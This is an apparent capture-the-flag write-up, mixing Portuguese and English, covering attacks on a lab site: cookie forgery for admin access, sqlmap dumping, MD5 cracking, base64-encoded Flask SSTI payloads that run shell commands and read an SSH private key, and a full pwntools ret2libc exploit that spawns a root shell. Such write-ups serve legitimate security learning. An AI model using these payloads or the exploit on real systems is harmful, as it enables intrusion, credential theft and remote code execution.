by F0x
alvo: tribopapaxota.org

## **Task Code - Script**
### **Pergunta**
Analise todos os scripts.
```js
console.log("Hello, patonymous!");
```
### **Resposta**
![[Pasted image 20240831013420.png]]

acessando tribopapaxota.org, vi tava vazio ent ja fiz um scan de diretorios com o feroxbuster
![[Pasted image 20240831010320.png]]

visto o nome da task, dei uma olhada no http://tribopapaxota.org:8888/static/scripts.js
e essa função me chamou a atenção:
`function blob(){let _=String.fromCharCode(...[81,85,65,67,75,123,74,53,95,99,52,110,95,108,51,52,100,95,49,110,102,48,114,109,52,55,49,48,110,53,125]);return _;}`

pondo no CyberChef: QUACK{J5_c4n_l34d_1nf0rm4710n5}

## **Task OSINT - Matrix**
### **Pergunta**
Apenas conecte-se e descubra.
`nc tribopapaxota.org 1337`
### **Resposta**
![[Pasted image 20240831025603.png]]

pesquisei por "Trinity hacks City Power Grid in Matrix", e procurei nas imagens, ate achar algo que me desse informações como por exemplo: 
![[Pasted image 20240831030330.png]]
Abri a imagem, e tentei Z10N0101

![[Pasted image 20240831030448.png]]

Essa foi facil, uma rapida pesquisa ja da a resposta, Zion

![[Pasted image 20240831030655.png]]
 
QUACK{Z10N0101_M0rph3u5_h45_f0und_h15_Ch053n_0n3}


## **Task Endpoint - Endpoint**
### **Pergunta**
Encontre o endpoint que está vazando informações confidenciais.
### **Resposta**
Desde que já tinhamos encontrado o endpoint api, desconfiei e rodei um scan de endpoints de api
![[Pasted image 20240831034330.png]]
Indo para o endpoints /api/v1/users/1
![[Pasted image 20240902233704.png]]
QUACK{AP1_c4n_b3_vuln3r4bl3}

## **Task - Endpoint - MFA**
### **Pergunta**
Outro endpoint que está vazando informações.
### **Resposta**
http://tribopapaxota.org:8888/login
descobri duck:quack, mas precisava de MFA, ent vi q o user cat n precisava de MFA
![[Pasted image 20240831231208.png]]

descobri cat:meow
![[Pasted image 20240831232500.png]]

olhei as cookies
Y2F0OjRhNGJlNDBjOTZhYzYzMTRlOTFkOTNmMzgwNDNhNjM0
(base64) -> cat:4a4be40c96ac6314e91d93f38043a634

usando https://crackstation.net/
![[Pasted image 20240831231811.png]]
cookie parece ser (user):(hash md5 da pass) encodado em base64

vamos tentar com outros user, como duck
duck:cfaf278e8f522c72644cee2a753d2845 -> ZHVjazpjZmFmMjc4ZThmNTIyYzcyNjQ0Y2VlMmE3NTNkMjg0NQ==

![[Pasted image 20240831232541.png]]
Funciona!!

(fui pesquisando pelo barulho q os animais faziam para ver se conseguia achar a pass)
tiger:growl
bear: -
wolf:howl
fox:yip
eagle: -
shark: -
owl:hoot
dolphin: -
panda:bleat

(passado 1 dia, decidi focar em outra coisa, e dps voltar aqui)
## **Task Injection - Dump**
### **Pergunta**
Outro endpoint que está vazando informações.
### **Resposta**
já tinha reparado q quando punha um `'` o erro era diferente.
Erro sem `'`
![[Pasted image 20240901155048.png]]

Erro com `'`
![[Pasted image 20240901155117.png]]

Já que estava a ficar sem opções e teorias, rodei um sqlmap só por descargo de consciência (e não é que era mesmo...)
guardei a request acima como request.txt, e rodei o comando:
`sqlmap -r request.txt --dump`
![[Pasted image 20240901155000.png]]

QUACK{db_w45_dump3d}

## **Task Hash - F0x**
### **Pergunta**
Qual a senha do usuário `fox`?
### **Resposta**
como vimos anteriormente na DB dumpada conseguimos o hash do user fox: 66b6d4c61b23a85b8d375e77104b9e14
usei o https://crackstation.net -> yip (eu já tinha descoberto antes heheh)
QUACK{yip}

## **Task Hash - Dashboard**
### **Pergunta**
Obtenha acesso acesso ao painel administrativo.
### **Resposta**
Tentar ficar admin, fiz login com as credenciais cat:meow,
peguei nas credenciais do admin (user e passwd):
admin:703b179695b26fc01e4b18e3e605de2a
encodei em base64:YWRtaW46NzAzYjE3OTY5NWIyNmZjMDFlNGIxOGUzZTYwNWRlMmE=
troquei a cookie DUCKY para a do admin
QUACK{4DM1N_15_N0T_S0_S3CUR3}

## **Task Hash - Dehash**
### **Pergunta**
Qual a senha do usuário `admin`?
### **Resposta**
`bopscrk -i`
(depois de várias tentativas e muitas horas)
![[Pasted image 20240901233229.png]]
`john hash.txt --wordlist=duckywalletV2.txt --format=Raw-MD5 --rules=best64 --fork=8`
admin:DuckyW4ll3t!!

## **Task Endpoint - MFA (CONTINUAÇÃO)**
(DPS DE 1-2 dias, muitas horas e muito fuzzing...)
A RESPOSTA TAVA NA CARA O TEMPO TODO
lembrei da BD dumpada, e da coluna totp_secret... (foi só parar e raciocinar) 
![[Pasted image 20240902142238.png]]
QUACK{T0TP_g3n3r4t0r_1s_t00_much_d4ng3r0u5}

## **Task Injection - Flask**
### **Pergunta**
Obtenha informações internas da aplicação Flask.
### **Resposta**
(usei as dicas mas já suspeitava q era para explorar um SSTI num cookie, https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask)
tools usadas: cyberchef.io

e3s3Kjd9fTo3MDNiMTc5Njk1YjI2ZmMwMWU0YjE4ZTNlNjA1ZGUyYQ==
(base64) -> `{{7*7}}`:703b179695b26fc01e4b18e3e605de2a (hash MD5 admin)

![[Pasted image 20240902155708.png]]

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#python
https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
https://github.com/payloadbox/ssti-payloads

e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcyddLnBvcGVuKCdpZCcpLnJlYWQoKX19OjcwM2IxNzk2OTViMjZmYzAxZTRiMThlM2U2MDVkZTJh
(base64) -> `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`:703b179695b26fc01e4b18e3e605de2a`
![[Pasted image 20240902161723.png]]

e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcyddLnBvcGVuKCdscycpLnJlYWQoKX19OjcwM2IxNzk2OTViMjZmYzAxZTRiMThlM2U2MDVkZTJh 
(base64) -> `{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`:703b179695b26fc01e4b18e3e605de2a
![[Pasted image 20240902161534.png]]

e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcyddLnBvcGVuKCdjYXQgLi9mbGFnLnR4dCcpLnJlYWQoKX19OjcwM2IxNzk2OTViMjZmYzAxZTRiMThlM2U2MDVkZTJh
(base64) -> `{{config.__class__.__init__.__globals__['os'].popen('cat ./flag.txt').read()}}`:703b179695b26fc01e4b18e3e605de2a

![[Pasted image 20240902170251.png]]

QUACK{W17h_5571_RC3_15_v3ry_51mpl3}

## **Task Linux - Duck**

e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcyddLnBvcGVuKCdwd2QnKS5yZWFkKCl9fTo3MDNiMTc5Njk1YjI2ZmMwMWU0YjE4ZTNlNjA1ZGUyYQ==
(base64) -> `{{config.__class__.__init__.__globals__['os'].popen('pwd').read()}}`:703b179695b26fc01e4b18e3e605de2a
![[Pasted image 20240902165941.png]]

e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcyddLnBvcGVuKCdscyAvaG9tZScpLnJlYWQoKX19OjcwM2IxNzk2OTViMjZmYzAxZTRiMThlM2U2MDVkZTJh
(base64) -> `{{config.__class__.__init__.__globals__['os'].popen('ls /home').read()}}`:703b179695b26fc01e4b18e3e605de2a
![[Pasted image 20240902170702.png]]

e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcyddLnBvcGVuKCdscyAtbGFoIC9ob21lL2R1Y2snKS5yZWFkKCl9fTo3MDNiMTc5Njk1YjI2ZmMwMWU0YjE4ZTNlNjA1ZGUyYQ==
(base64) -> `{{config.__class__.__init__.__globals__['os'].popen('ls -lah /home/duck').read()}}`:703b179695b26fc01e4b18e3e605de2a
![[Pasted image 20240902170819.png]]

total 100K 
drwxr-xr-x 8 duck duck 4.0K Aug 22 17:49 . 
drwxr-xr-x 4 root root 4.0K Aug 14 08:48 .. 
drwxr-xr-x 2 root root 4.0K Aug 22 17:46 .bash_history 
-rw-r--r-- 1 duck duck 220 Aug 14 08:48 .bash_logout 
-rw-r--r-- 1 duck duck 3.7K Aug 22 17:49 .bashrc 
drwxrwxr-x 3 duck duck 4.0K Aug 21 23:59 .cache 
drwx------ 3 duck duck 4.0K Aug 21 20:35 .config 
-rw------- 1 duck duck 20 Aug 22 04:07 .lesshst 
drwxrwxr-x 3 duck duck 4.0K Aug 21 20:45 .local 
drwxrwxr-x 2 duck duck 4.0K Aug 14 09:14 manutencao 
-rw-r--r-- 1 duck duck 807 Aug 14 08:48 .profile 
drwx------ 2 duck duck 4.0K Aug 14 08:50 .ssh 
-rw-rw-r-- 1 root root 27 Aug 22 00:37 wtduck.txt 
-rw-rw-r-- 1 duck duck 48K Aug 22 17:48 .zcompdump


e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcyddLnBvcGVuKCdscyAtbGFoIC9ob21lL2R1Y2svLnNzaCcpLnJlYWQoKX19OjcwM2IxNzk2OTViMjZmYzAxZTRiMThlM2U2MDVkZTJh
(base64) -> `{{config.__class__.__init__.__globals__['os'].popen('ls -lah /home/duck/.ssh').read()}}`:703b179695b26fc01e4b18e3e605de2a
![[Pasted image 20240902171117.png]]

total 20K 
drwx------ 2 duck duck 4.0K Aug 14 08:50 . 
drwxr-xr-x 8 duck duck 4.0K Aug 22 17:49 .. 
-rw-rw-r-- 1 duck duck 570 Aug 14 08:50 authorized_keys 
-r-------- 1 duck duck 2.6K Aug 14 08:49 id_rsa 
-r--r--r-- 1 duck duck 570 Aug 14 08:49 id_rsa.pub

e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcyddLnBvcGVuKCdjYXQgL2hvbWUvZHVjay8uc3NoL2lkX3JzYScpLnJlYWQoKX19OjcwM2IxNzk2OTViMjZmYzAxZTRiMThlM2U2MDVkZTJh
(base64) -> `{{config.__class__.__init__.__globals__['os'].popen('cat /home/duck/.ssh/id_rsa').read()}}`:703b179695b26fc01e4b18e3e605de2a
![[Pasted image 20240902171349.png]]

copiar para id_rsa.txt
chmod 600 id_rsa
ssh -i id_rsa duck@tribopapaxota.org
![[Pasted image 20240902173844.png]]

QUACK{duck_h45_b33n_pwn3d}

Had to leave a message :)
![[Pasted image 20240905165416.png]]

## **Task Linux - Root**
### **Pergunta**
**WOOP WOOP GOT ROOT?** Suba ao topo da hierarquia e governe o sistema.
### **Resposta**
[[re2libc]]

1. copiei para o meu PC os ficheiros duck2root e libc.so.6
2. ja tinha visto alguns blogues sobre binary exploitation e lembrei do comando `checksec` para ver as proteções no binário
![[Pasted image 20240904190737.png]]
vi q tinha NX e fui pesquisar sobre "ELF binary exploitation NX bypass" e vi um termo familiar "ret2libc", pesquisando mais sobre encontrei o seguinte blog
https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/
mas eu queria mais, procurando no YT por videos de ret2libc até que encontrei 
https://www.youtube.com/watch?v=tMN5N5oid2c
(era exatamente o que eu estava á procura, explicando em detalhe, cada passo, até um pouco de bases fundamentais)

--------------------------------- DURANTE 2 LONGOS DIAS --------------------------------------

LINK para BinaryExploitation.md este aqui para pag. github, e o script (para solver ambos picoCTF e este)

O que instalar:
gbg gef - https://github.com/hugsy/gef
pwntools (pip3 install pwn)
pwninit - https://github.com/io12/pwninit/releases/download/3.3.1/pwninit

Baixar o binário e a lib:
![[Pasted image 20240904194510.png]]

Depois de baixar o binário e a lib:
1. `pwninit --bin duck2root --libc libc.so.6`
![[Pasted image 20240904190718.png]]
2. `patchelf --set-interpreter ./ld-2.35.so ./duck2root` 
3. `checksec ./duck2root`
![[Pasted image 20240904190737.png]]


2. Open it in Ghidra
see the buffer, 64 bytes
![[Pasted image 20240905162903.png]]
see that if we input more than the buffer it gives a segmentation fault error

 3. Debuggin it with gdb
 `start` , `r` to run it, establish connection, input a lot of A 's, (examine the results)

 `x/gx $rsp` (examine/8 bytes hexadecimal $pointer_to_stack) $rsp = printf??
 `0x7fffffffdcf8: 0x4141414141414141`

We know we have to overflow it, we know we have control of the value on the stack that will eventually be put in the instruction pointer, configure out how many bytes it'll take before it gets to that instruction pointer

Using `pattern` (similar to metasploit), but before we have to go back to ghidra to configure out how many bytes we want to put in.
Since the allocated buffer is 64, we will put 100 (redounded to the hundreds)
`pattern create 100` (creates a "De Bruijn sequence" with 100 bytes)
run the program again with `r` and input that sequence
see that rsp is pointing to our string
`pattern offset $rsp`
```
[+] Found at offset 72 (little-endian search) likely
```
check if its overflowing: `pattern create 72`, run the program again with `r` and input that sequence with 8 more A's to see that the rsp is overflowing with our payload (8 A's)


back to ghidra and we go to the printf -> 2x click -> .plt (search for printf) -> .got.plt section -> search for printf
We want to find a way to print the value of the adress of printf -> search for puts or printf (only function we have that we know the address of) -> will allow us to leak memory
(value after the printf function is the GOT) we have a value inside our binary that we know a libc address is gonna exist

ROPgadgets is sequence of instructions that end in a return instruction. 
We can use Ghidra (manual), or ropper / ropgadget (tools)
With ROPgadget: `ROPgadget --binary duck2root`

Now we go back to ghidra in our vuln program, and look for the suspected function and click on return, and see the address `00400770`

Now we debug our ROPchain `gdb.attach(p)`
and set a breakpoint to that address `b *0x400770`
and `c` for continue
`si` to go the next instruction
until we reach `0x400914 <__libc_csu_init+0064> ret`
examine what is rdi `x/gx $rdi`
everything should be right
with gdb, set breakpoint in main `b main` and continue `c`
See the leaked address (in our script), copy it and examine it in gdb `x 0x7f798ac7bf30`
it should say printf

run the script, it opens a gdb window, input `c` 
and `telescope $rsp-32` (find our payload)
(Something is wrong)
We now want to know what is the layout of the stack before and after we put our payload
Run the script, it opens a gdb window, set 2 breakpoints: 1: `b vulnerable_function`,
`disassemble vulnerable_function`, (grab address of ret instruction), and 2:`b *0x400770`
`c` for continue, and its gonna leak our ROPchain, `si`, `enter`, until we reach 
`0x400914 <__libc_csu_init+0064> ret` (puts), and see that rdi prints our printf function
`c` continue, back to our script and see that it leaked the address,
check leaked address `x 0x7fae1f688540` (0x7fae1f688540 was the address that was leaked),
it gives this `0x7fae1f688540 <__printf>:        0x002000ba` (as we intended),
and with `vm` check that the libc address (2nd address in the script) is in libc.so.6 's path
`p system - 0x00007fae1f600000` (libc address above), check that it matches our system_offset

everything is good, `si`, `ni` (next instruction), go right before it calls scanf (that will receive our input), stop at `0x4006fe <do_stuff+0026>  call   0x400580 <__isoc99_scanf@plt>`
copy the rsi value `0x00007fff0399ef80`, `ni`, `telescope 0x00007fff0399ef80` (see that it has our payload), `telescope 0x00007fff0399ef80 -l 64` (to see more),
after the `pop rdi` instruction it should have our /bin/sh but it doesn't, so our /bin/sh is wrong
`grep /bin/sh` (look for /bin/sh), we get 
`0x7fae1f7b40fa - 0x7fae1f7b4101  →   "/bin/sh"`, 
`x/s 0x7fae1f7b40fa` (see that we get string /bin/sh), `0x7fae1f7b40fa: "/bin/sh"`
(find the /bin/sh offset) `p 0x7fae1f7b40fa - 0x00007fae1f600000` (p 0x00007fae1f600000 from libc address 12 above), we get `$2 = 0x1b40fa` (check that it matches our bin_sh_offset)

we still don't have a shell, so something is missing
run the script once again, it will open a gdb window, `disassemble do_stuff`, (grab address of ret instruction), `b *0x400770`, `c`, `c`, `si`, verify that we have our /bin/sh on the stack, `si`, `si`, verify that rdi is the actual address of libc, it still gives an error and it is segmentation faulting because the libc is using our system linker (the exploit works)

doesn't work because its stack alligned

`ROPgadget --binary vuln | grep -i ": ret"` (search for any ret instruction), 
`0x000000000040052e : ret`, we will use 0x40052e

FINALLY WORKING EXPLOIT (depois de muitas iterações, perguntas e dúvidas)
```python
#!/usr/bin/env python3

from pwn import * 

exe = process('./duck2root_patched')
p = remote("localhost", 5001)

pop_rdi = 0x40126d
printf_at_got = 0x404018
puts_at_plt = 0x401030
ret_to_vuln = 0x401272

payload = b"A"*72
payload += p64(pop_rdi) # pop rdi; ret
payload += p64(printf_at_got) # printf got
payload += p64(puts_at_plt) # puts plt
payload += p64(ret_to_vuln) # return to ask 

p.sendlineafter("Patonymous?>\n",payload) # send payload

leak = u64(p.recvline().strip().ljust(8, b"\x00")) # leaked address

log.info(f"Leaked printf address: {hex(leak)}")

printf_offset = 0x606f0

base_address = leak - printf_offset # calculate base address libc
log.info(f"Leaked libc base address: {hex(base_address)}")
input()
libc_binsh = 0x1d8678 # offset /bin/sh
libc_system = 0x0000000000050d70 # offset system
log.info(f"Leaked libc system address: {hex(base_address + libc_system)}")

# second ROPchain (payload), now that its waiting to receive input

payload2 = b"A" * 72
payload2 += p64(pop_rdi)
payload2 += p64(base_address + libc_binsh) # libc -> /bin/sh > strings -a -t x ./libc.so.6 | grep "/bin/sh"
payload2 += p64(0x000000000040101a) # ret > ROPgadget --bin binary | grep ret
payload2 += p64(base_address + libc_system) # libc -> system
p.sendlineafter("Patonymous?>\n", payload2) # >;) - delivery payload

p.interactive()
```

![[Pasted image 20240905163804.png]]QUACK{R3t2l1bc_1s_t00_3a5y_t0_3xpl01t}

And ofc I had to leave a message as root to :)
![[Pasted image 20240905165621.png]]